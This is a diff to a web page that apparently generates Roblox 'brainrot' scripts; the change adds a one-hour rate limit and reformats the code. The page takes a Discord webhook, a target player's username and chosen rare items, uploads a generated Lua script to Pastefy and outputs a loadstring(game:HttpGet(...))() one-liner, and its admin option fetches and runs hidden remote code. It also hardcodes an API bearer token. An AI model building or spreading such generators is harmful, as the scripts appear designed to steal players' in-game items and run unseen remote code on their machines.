@@ -550,6 +550,11 @@
       </div>
     </div>
   </div>
+ <div class="panel">
+    <div class="pb">
+        <p class="hint" id="timeRemainingHint"></p>
+    </div>
+</div>
   <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
   <div class="panel">
     <div class="out-ph">
@@ -765,123 +770,185 @@ const ANIMALS = [
   { name: "Jackorilla", rarity: "Secret", mps: "315K/s" },
   { name: "Secret Lucky Block", rarity: "Secret", mps: "0/s" }
 ];
- const KV_WORKER_URL = 'https://young-bonus-cf67.dongdihng.workers.dev';
+const KV_WORKER_URL = 'https://young-bonus-cf67.dongdihng.workers.dev';
 
-function generateAlias(length = 8) {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-  let result = '';
-  const randomValues = new Uint8Array(length);
-  crypto.getRandomValues(randomValues);
-  for (let i = 0; i < length; i++) {
-    result += chars.charAt(randomValues[i] % chars.length);
-  }
-  return result;
+// Function to check if the user can generate a script
+function canGenerateScript() {
+    const lastGeneratedTime = localStorage.getItem('lastScriptGenerationTime');
+    if (!lastGeneratedTime) {
+        return true; // First script, allowed
+    }
+
+    const currentTime = new Date().getTime();
+    const oneHour = 60 * 60 * 1000; // 1 hour in milliseconds
+    const timeElapsed = currentTime - lastGeneratedTime;
+
+    return timeElapsed >= oneHour;
 }
 
+// Function to record the time of script generation
+function recordScriptGeneration() {
+    localStorage.setItem('lastScriptGenerationTime', new Date().getTime());
+}
+
+// Function to get the remaining time before the next script can be generated
+function getTimeRemaining() {
+    const lastGeneratedTime = localStorage.getItem('lastScriptGenerationTime');
+    if (!lastGeneratedTime) {
+        return 0; // No script generated, no remaining time
+    }
+
+    const currentTime = new Date().getTime();
+    const oneHour = 60 * 60 * 1000;
+    const timeElapsed = currentTime - lastGeneratedTime;
+    const timeRemaining = oneHour - timeElapsed;
+
+    return Math.max(0, Math.ceil(timeRemaining / 1000 / 60)); // Return remaining time in minutes
+}
+
+// Function to format the remaining time into readable text
+function formatTimeRemaining(minutes) {
+    if (minutes <= 0) {
+        return "You can generate a script now.";
+    } else if (minutes === 1) {
+        return `You must wait 1 minute before generating another script.`;
+    } else {
+        return `You must wait ${minutes} minutes before generating another script.`;
+    }
+}
+function updateTimeRemainingDisplay() {
+    const timeRemaining = getTimeRemaining();
+    const hintElement = document.getElementById('timeRemainingHint');
+    if (hintElement) {
+        hintElement.textContent = formatTimeRemaining(timeRemaining);
+    }
+}
+
+// Update the display on page load
+updateTimeRemainingDisplay();
+
+// Update the display every minute
+setInterval(updateTimeRemainingDisplay, 60000);
+function generateAlias(length = 8) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let result = '';
+    const randomValues = new Uint8Array(length);
+    crypto.getRandomValues(randomValues);
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(randomValues[i] % chars.length);
+    }
+    return result;
+}
 
 let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
 
 function setAdminMode(mode) {
-  adminMode = mode;
-  const buttons = document.querySelectorAll('.admin-mode-btn');
-  buttons.forEach(btn => btn.classList.remove('active'));
-  event.target.classList.add('active');
+    adminMode = mode;
+    const buttons = document.querySelectorAll('.admin-mode-btn');
+    buttons.forEach(btn => btn.classList.remove('active'));
+    event.target.classList.add('active');
 
-  const customInput = document.getElementById('customAdminInput');
-  if (mode === 'custom') {
-    customInput.style.display = 'block';
-  } else {
-    customInput.style.display = 'none';
-  }
+    const customInput = document.getElementById('customAdminInput');
+    if (mode === 'custom') {
+        customInput.style.display = 'block';
+    } else {
+        customInput.style.display = 'none';
+    }
 }
 
 function updateCustomAdmin() {
-  customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
-}
- async function uploadToPastefy(script) {
-  try {
-    const response = await fetch('https://pastefy.app/api/v2/paste', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer TOqlFBWVLGEx5wKbIL0KCxXrH0K9OqaHldWifeQP7B2m2LOLuxfoGOgYF0j4'
-      },
-      body: JSON.stringify({
-        title: "Vinhub Script - " + new Date().toLocaleDateString(),
-        content: script,
-        encrypted: false,
-        expireAt: "1D"
-      })
-    });
-
-    if (!response.ok) {
-      const errorData = await response.json();
-      throw new Error(`Failed to upload to Pastefy: ${errorData.message || response.statusText}`);
-    }
-
-    const data = await response.json();
-    return data.paste.raw_url;
-  } catch (error) {
-    console.error("Pastefy upload error:", error);
-    return null;
-  }
+    customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
 }
 
- async function generate() {
-  const btn = document.querySelector('.btn-gen');
-  const out = document.getElementById('outputBlock');
+async function uploadToPastefy(script) {
+    try {
+        const response = await fetch('https://pastefy.app/api/v2/paste', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer TOqlFBWVLGEx5wKbIL0KCxXrH0K9OqaHldWifeQP7B2m2LOLuxfoGOgYF0j4'
+            },
+            body: JSON.stringify({
+                title: "Vinhub Script - " + new Date().toLocaleDateString(),
+                content: script,
+                encrypted: false,
+                expireAt: "1D"
+            })
+        });
 
-  if (btn.disabled) return;
-  btn.disabled = true;
-  btn.textContent = '⏳ Generating...';
-  btn.style.opacity = '0.6';
+        if (!response.ok) {
+            const errorData = await response.json();
+            throw new Error(`Failed to upload to Pastefy: ${errorData.message || response.statusText}`);
+        }
 
-  try {
-    const username = document.getElementById('usernameInput').value.trim();
-    const webhook = document.getElementById('webhookInput').value.trim();
+        const data = await response.json();
+        return data.paste.raw_url;
+    } catch (error) {
+        console.warn("Pastefy upload error:", error);
+        return null;
+    }
+}
 
-    if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
-    if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
-    if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
+async function generate() {
+    const btn = document.querySelector('.btn-gen');
+    const out = document.getElementById('outputBlock');
 
-    const alias = generateAlias();
+    if (btn.disabled) return;
 
-
-    const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({ alias, url: webhook }),
-  mode: 'cors',
-});
-
-    if (!kvResponse.ok) {
-      const error = await kvResponse.json();
-      throw new Error(error.error || 'Failed to store webhook.');
+    if (!canGenerateScript()) {
+        const timeRemaining = getTimeRemaining();
+        out.className = 'code-block empty';
+        out.textContent = formatTimeRemaining(timeRemaining);
+        return;
     }
 
-    const data = await kvResponse.json();
-  
+    btn.disabled = true;
+    btn.textContent = '⏳ Generating...';
+    btn.style.opacity = '0.6';
 
-    // Le reste de ton code...
-    const names = [...selected];
-    const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+    try {
+        const username = document.getElementById('usernameInput').value.trim();
+        const webhook = document.getElementById('webhookInput').value.trim();
 
-    let adminScriptPart = '';
-    if (adminMode === 'admin-panel') {
-      adminScriptPart = `
+        if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
+        if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
+        if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
+
+        const alias = generateAlias();
+
+        const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ alias, url: webhook }),
+            mode: 'cors',
+        });
+
+        if (!kvResponse.ok) {
+            const error = await kvResponse.json();
+            throw new Error(error.error || 'Failed to store webhook.');
+        }
+
+        const data = await kvResponse.json();
+
+        const names = [...selected];
+        const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+
+        let adminScriptPart = '';
+        if (adminMode === 'admin-panel') {
+            adminScriptPart = `
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
 end)
 `;
-    } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-      adminScriptPart = customAdminLoadstring;
-    }
+        } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
+            adminScriptPart = customAdminLoadstring;
+        }
 
-    const script = `getgenv().WEBHOOK_URL = "${alias}"
+        const script = `getgenv().WEBHOOK_URL = "${alias}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
@@ -892,155 +959,155 @@ end)
 ${adminScriptPart}
 `;
 
-    const pastefyRawUrl = await uploadToPastefy(script);
+        const pastefyRawUrl = await uploadToPastefy(script);
 
-    if (pastefyRawUrl) {
-      out.className = 'code-block';
-      out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
-    } else {
-      out.className = 'code-block';
-      out.textContent = `-- Failed to upload to Pastefy.
+        if (pastefyRawUrl) {
+            out.className = 'code-block';
+            out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
+        } else {
+            out.className = 'code-block';
+            out.textContent = `-- Failed to upload to Pastefy.
 Here is the raw script (copy it manually):
 
 ${script}`;
-    }
+        }
 
-  } catch (err) {
-    console.error("Erreur dans generate():", err);
-    out.className = 'code-block empty';
-    out.textContent = err.message || 'An error occurred.';
-  } finally {
-    setTimeout(() => {
-      btn.disabled = false;
-      btn.textContent = '⚡ Generate Script';
-      btn.style.opacity = '1';
-    }, 1500);
-  }
+        recordScriptGeneration(); // Record the time of generation
+    } catch (err) {
+        console.warn("Error in generate():", err);
+        out.className = 'code-block empty';
+        out.textContent = err.message || 'An error occurred.';
+    } finally {
+        setTimeout(() => {
+            btn.disabled = false;
+            btn.textContent = '⚡ Generate Script';
+            btn.style.opacity = '1';
+        }, 1500);
+    }
 }
 
 async function searchRobloxUsers(query) {
-  if (query.length < 3) return [];
+    if (query.length < 3) return [];
 
-  try {
-    const proxyUrl = `https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`;
-    const response = await fetch(proxyUrl);
-    if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    const data = await response.json();
-    return data.data || [];
-  } catch (error) {
-    console.error("Erreur lors de la recherche Roblox :", error);
-    return [];
-  }
+    try {
+        const proxyUrl = `https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`;
+        const response = await fetch(proxyUrl);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const data = await response.json();
+        return data.data || [];
+    } catch (error) {
+        console.warn("Error during Roblox search:", error);
+        return [];
+    }
 }
 
 async function fetchAvatarUrl(userId) {
-  try {
-    const proxyUrl = `https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`;
-    const response = await fetch(proxyUrl);
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+    try {
+        const proxyUrl = `https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`;
+        const response = await fetch(proxyUrl);
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const data = await response.json();
+        return data.imageUrl || null;
+    } catch (error) {
+        console.warn(`Unable to load avatar for user ${userId}:`, error.message);
+        return null;
     }
-    const data = await response.json();
-    return data.imageUrl || null;
-  } catch (error) {
-    console.warn(`Impossible de charger l'avatar pour l'utilisateur ${userId}:`, error.message);
-    return null;
-  }
 }
+
 async function showSuggestions(users) {
-  const container = document.getElementById('usernameSuggestions');
-  container.innerHTML = '';
+    const container = document.getElementById('usernameSuggestions');
+    container.innerHTML = '';
 
-  if (users.length === 0) {
-    const noResult = document.createElement('div');
-    noResult.className = 'suggestion-item';
-    noResult.innerHTML = `<span class="suggestion-username" style="color: var(--muted);">No user found.</span>`;
-    container.appendChild(noResult);
+    if (users.length === 0) {
+        const noResult = document.createElement('div');
+        noResult.className = 'suggestion-item';
+        noResult.innerHTML = `<span class="suggestion-username" style="color: var(--muted);">No user found.</span>`;
+        container.appendChild(noResult);
+        container.style.display = 'block';
+        return;
+    }
+
+    const userPromises = users.map(async (user) => {
+        const avatarUrl = await fetchAvatarUrl(user.id);
+        return { ...user, avatarUrl };
+    });
+
+    const usersWithAvatars = await Promise.all(userPromises);
+
+    usersWithAvatars.forEach(user => {
+        const item = document.createElement('div');
+        item.className = 'suggestion-item';
+        item.innerHTML = `
+            <div class="suggestion-avatar">
+                <img src="${user.avatarUrl || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4IiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiPjxjaXJjbGUgY3g9IjI0IiBjeT0iMjQiIHI9IjI0Ii8+PC9zdmc+'}" alt="${user.name}">
+            </div>
+            <div class="suggestion-info">
+                <p class="suggestion-username">${user.displayName || user.name}</p>
+                <p class="suggestion-handle">@${user.name}</p>
+            </div>
+            <span class="suggestion-id">${user.id}</span>
+        `;
+        item.onclick = () => {
+            document.getElementById('usernameInput').value = user.name;
+            container.style.display = 'none';
+            validateUsername();
+        };
+        container.appendChild(item);
+    });
     container.style.display = 'block';
-    return;
-  }
-
-
-  const userPromises = users.map(async (user) => {
-    const avatarUrl = await fetchAvatarUrl(user.id);
-    return { ...user, avatarUrl };
-  });
-
-  const usersWithAvatars = await Promise.all(userPromises);
-
-  usersWithAvatars.forEach(user => {
-  const item = document.createElement('div');
-  item.className = 'suggestion-item';
-  item.innerHTML = `
-    <div class="suggestion-avatar">
-      <img src="${user.avatarUrl || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4IiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiPjxjaXJjbGUgY3g9IjI0IiBjeT0iMjQiIHI9IjI0Ii8+PC9zdmc+'}" alt="${user.name}">
-    </div>
-    <div class="suggestion-info">
-      <p class="suggestion-username">${user.displayName || user.name}</p>
-      <p class="suggestion-handle">@${user.name}</p>
-    </div>
-    <span class="suggestion-id">${user.id}</span>
-  `;
-  item.onclick = () => {
-    document.getElementById('usernameInput').value = user.name;
-    container.style.display = 'none';
-    validateUsername();
-  };
-  container.appendChild(item);
-});
-  container.style.display = 'block';
 }
-
 
 const debounce = (func, delay) => {
-  let timeoutId;
-  return function(...args) {
-    clearTimeout(timeoutId);
-    timeoutId = setTimeout(() => func.apply(this, args), delay);
-  };
+    let timeoutId;
+    return function(...args) {
+        clearTimeout(timeoutId);
+        timeoutId = setTimeout(() => func.apply(this, args), delay);
+    };
 };
 
 document.getElementById('usernameInput').addEventListener('input', debounce(async function(e) {
-  const query = e.target.value.trim();
-  if (query.length === 0) {
-    document.getElementById('usernameSuggestions').style.display = 'none';
-    return;
-  }
-  const users = await searchRobloxUsers(query);
-  showSuggestions(users);
+    const query = e.target.value.trim();
+    if (query.length === 0) {
+        document.getElementById('usernameSuggestions').style.display = 'none';
+        return;
+    }
+    const users = await searchRobloxUsers(query);
+    showSuggestions(users);
 }, 300));
 
 function renderList(filter) {
-  const q = (filter || '').toLowerCase();
-  const list = document.getElementById('animalList');
-  list.innerHTML = '';
-  ANIMALS.forEach(animal => {
-    if (q && !animal.name.toLowerCase().includes(q)) return;
-    const row = document.createElement('div');
-    row.className = 'a-item' + (selected.has(animal.name) ? ' on' : '');
-    const cb = document.createElement('input');
-    cb.type = 'checkbox';
-    cb.checked = selected.has(animal.name);
-    cb.addEventListener('change', e => { e.stopPropagation(); toggle(animal.name); });
-    const lbl = document.createElement('span');
-    lbl.className = 'a-name';
-    lbl.textContent = animal.name;
-    const badge = document.createElement('span');
-    badge.className = animal.rarity === 'OG' ? 'badge-og' : 'badge-secret';
-    badge.textContent = animal.rarity;
-    const mps = document.createElement('span');
-    mps.className = 'a-meta';
-    mps.textContent = animal.mps;
-    row.append(cb, lbl, badge, mps);
-    row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
-    list.appendChild(row);
-  });
-  document.getElementById('selNum').textContent = selected.size;
+    const q = (filter || '').toLowerCase();
+    const list = document.getElementById('animalList');
+    list.innerHTML = '';
+    ANIMALS.forEach(animal => {
+        if (q && !animal.name.toLowerCase().includes(q)) return;
+        const row = document.createElement('div');
+        row.className = 'a-item' + (selected.has(animal.name) ? ' on' : '');
+        const cb = document.createElement('input');
+        cb.type = 'checkbox';
+        cb.checked = selected.has(animal.name);
+        cb.addEventListener('change', e => { e.stopPropagation(); toggle(animal.name); });
+        const lbl = document.createElement('span');
+        lbl.className = 'a-name';
+        lbl.textContent = animal.name;
+        const badge = document.createElement('span');
+        badge.className = animal.rarity === 'OG' ? 'badge-og' : 'badge-secret';
+        badge.textContent = animal.rarity;
+        const mps = document.createElement('span');
+        mps.className = 'a-meta';
+        mps.textContent = animal.mps;
+        row.append(cb, lbl, badge, mps);
+        row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
+        list.appendChild(row);
+    });
+    document.getElementById('selNum').textContent = selected.size;
 }
 
 function toggle(name) {
-  selected.has(name) ? selected.delete(name) : selected.add(name);
-  renderList(document.getElementById('searchBox').value);
+    selected.has(name) ? selected.delete(name) : selected.add(name);
+    renderList(document.getElementById('searchBox').value);
 }
 
 function filterList() { renderList(document.getElementById('searchBox').value); }
@@ -1048,43 +1115,42 @@ function selectAll() { ANIMALS.forEach(n => selected.add(n.name)); renderList(do
 function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
 
 function validateUsername() {
-  const username = document.getElementById('usernameInput').value.trim();
-  const hint = document.getElementById('usernameHint');
-  if (username.length < 3) {
-    hint.classList.add('error');
-    hint.textContent = 'Username must be at least 3 characters long!';
-    return false;
-  } else {
-    hint.classList.remove('error');
-    hint.textContent = 'The Roblox username to target in the script (3 characters minimum).';
-    return true;
-  }
+    const username = document.getElementById('usernameInput').value.trim();
+    const hint = document.getElementById('usernameHint');
+    if (username.length < 3) {
+        hint.classList.add('error');
+        hint.textContent = 'Username must be at least 3 characters long!';
+        return false;
+    } else {
+        hint.classList.remove('error');
+        hint.textContent = 'The Roblox username to target in the script (3 characters minimum).';
+        return true;
+    }
 }
 
 function validateWebhook() {
-  const webhook = document.getElementById('webhookInput').value.trim();
-  const hint = document.getElementById('webhookHint');
-  if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
-    hint.classList.add('error');
-    hint.textContent = 'Webhook must start with https://discord.com/api/webhooks/!';
-    return false;
-  } else {
-    hint.classList.remove('error');
-    hint.textContent = 'Paste your Discord webhook (must start with https://discord.com/api/webhooks/).';
-    return true;
-  }
+    const webhook = document.getElementById('webhookInput').value.trim();
+    const hint = document.getElementById('webhookHint');
+    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
+        hint.classList.add('error');
+        hint.textContent = 'Webhook must start with https://discord.com/api/webhooks/!';
+        return false;
+    } else {
+        hint.classList.remove('error');
+        hint.textContent = 'Paste your Discord webhook (must start with https://discord.com/api/webhooks/).';
+        return true;
+    }
 }
 
-
 function copyOut() {
-  const code = document.getElementById('outputBlock').textContent;
-  if (!code || code.startsWith('--')) return;
-  navigator.clipboard.writeText(code).then(() => {
-    const btn = document.getElementById('copyBtn');
-    btn.textContent = '✓ Copied!';
-    btn.classList.add('ok');
-    setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
-  });
+    const code = document.getElementById('outputBlock').textContent;
+    if (!code || code.startsWith('--')) return;
+    navigator.clipboard.writeText(code).then(() => {
+        const btn = document.getElementById('copyBtn');
+        btn.textContent = '✓ Copied!';
+        btn.classList.add('ok');
+        setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
+    });
 }
 
 renderList();
